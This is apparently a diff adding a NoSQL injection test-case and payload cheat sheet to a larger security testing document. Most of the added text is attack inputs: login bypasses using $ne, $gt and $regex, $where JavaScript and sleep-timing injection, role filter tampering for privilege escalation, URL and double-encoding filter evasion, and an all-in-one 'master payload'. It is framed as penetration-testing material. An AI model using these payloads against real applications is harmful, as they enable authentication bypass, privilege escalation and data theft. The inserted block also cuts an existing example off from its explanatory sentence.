@@ -7900,6 +7900,286 @@ An attacker can inject a NoSQL query: `{ "$gt": 0 }`.
 ```js
 db.products.find({ "price": { "$gt": 0 } })
 ```
+# ✅ **NoSQL Injection – Complete Test Case (with Bypass Cases)**
+
+### **1.1 Boolean-Based NoSQL Injection**
+
+Injecting `$ne`, `$gt`, `$exists` etc. to force conditions to always evaluate to true.
+
+### **1.2 Query Operator Injection**
+
+Manipulating backend JSON queries using `$ne`, `$in`, `$regex`, `$eq`, `$or`, `$and`, etc.
+
+### **1.3 Authentication Bypass**
+
+Bypassing login by injecting operators so password validation is skipped.
+
+### **1.4 Regex-Based Injection**
+
+Using wildcard regex like `.*` or `^` to match any username or password.
+
+### **1.5 Blind NoSQL Injection**
+
+Observing response/time differences to extract data without direct output.
+
+### **1.6 Projection Manipulation**
+
+Injecting projection modifiers to expose hidden fields or bypass restrictions.
+
+### **1.7 $where JavaScript Injection (MongoDB)**
+
+Injecting JavaScript expressions when `$where` is enabled in backend queries.
+
+### **1.8 Array-Based Injection**
+
+Sending arrays instead of strings to break query logic or force unintended matches.
+
+### **1.9 Type Confusion Injection**
+
+Exploiting loosely typed fields (string vs number vs boolean) to bypass conditions.
+
+### **1.10 Privilege Escalation via Filter Tampering**
+
+Manipulating role or access filters to escalate privileges.
+
+---
+
+# **2. Sample Payloads (Test Inputs)**
+
+Below are safe, defensive sample payloads showing where injection can occur.
+
+---
+
+### **2.1 Basic Operator Injection**
+
+```
+username=admin&password[$ne]=null
+```
+
+```
+{ "username": { "$ne": null }, "password": { "$ne": null } }
+```
+
+---
+
+### **2.2 Authentication Bypass Payloads**
+
+```
+username=admin&password[$gt]=0
+```
+
+```
+password[$exists]=true
+```
+
+---
+
+### **2.3 Regex Injection**
+
+```
+username=admin&password[$regex]=.*
+```
+
+```
+password[$regex]=^a
+```
+
+---
+
+### **2.4 Blind Injection Payloads**
+
+```
+username=admin&password[$regex]=^(?=.{1,}).*
+```
+
+Timing-based:
+
+```
+$where=sleep(5000)
+```
+
+---
+
+### **2.5 $where JavaScript Injection**
+
+```
+{"$where": "this.password.length > 0"}
+```
+
+```
+{"$where": "function() { return true; }"}
+```
+
+---
+
+### **2.6 Array-Based Injection**
+
+```
+username[]=admin
+```
+
+```
+password[]=123
+```
+
+---
+
+### **2.7 Type Confusion Payloads**
+
+```
+username=true
+```
+
+```
+password=0
+```
+
+---
+
+### **2.8 Privilege Escalation Payloads**
+
+```
+role[$ne]=user
+```
+
+```
+{"role": {"$in": ["admin", "superuser"]}}
+```
+
+---
+
+# **3. Bypass Techniques (Advanced)**
+
+These mimic real-world bypass approaches used against weak NoSQL filters.
+
+---
+
+### **3.1 Operator Obfuscation Bypass**
+
+```
+password[%24ne]=null
+```
+
+```
+password[$n%e]=null
+```
+
+---
+
+### **3.2 JSON Structure Manipulation**
+
+```
+{ "username": "admin", "$or": [ {}, { "password": { "$ne": "test" } } ] }
+```
+
+---
+
+### **3.3 Array Injection Bypass**
+
+```
+username=admin&password[$in][]=anything
+```
+
+---
+
+### **3.4 Encoded Injection**
+
+URL-encoded:
+
+```
+password%5B%24ne%5D=null
+```
+
+Double-encoded:
+
+```
+password%255B%2524ne%255D=null
+```
+
+---
+
+### **3.5 Regex Bypass Variants**
+
+```
+password[$regex]=.*
+password[$regex]=^.*
+password[$regex]=(?s).*
+password[$regex]=.{0,100}
+```
+
+---
+
+### **3.6 JavaScript Bypass (MongoDB)**
+
+```
+$where=1==1
+```
+
+```
+$where=function(){return(true);}
+```
+
+---
+
+### **3.7 Numeric/String Type Abuse**
+
+```
+"role": 1
+```
+
+```
+"role": "1"
+```
+
+Backend may treat numbers as admin flags.
+
+---
+
+### **3.8 Boolean-Type Bypass**
+
+```
+"username": true
+```
+
+```
+"password": false
+```
+
+---
+
+### **3.9 Logical Injection ($or / $and)**
+
+```
+{ "$or": [ { "username": "admin" }, { "username": { "$ne": null } } ] }
+```
+
+```
+{ "$and": [ { "role": "user" }, { "role": { "$ne": "user" } } ] }
+```
+
+---
+
+### **3.10 Null Injection**
+
+```
+{ "username": null }
+```
+
+Sometimes matches everything due to weak matching.
+
+---
+
+# **4. Combined Master Payload (All-In-One Fuzzer)**
+
+Single payload for broad test coverage.
+
+```
+username=admin
+password[$ne]=null
+password[$regex]=.*
+role[$in][]=admin
+$where=function(){return true;}
+```
 
 Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.
 
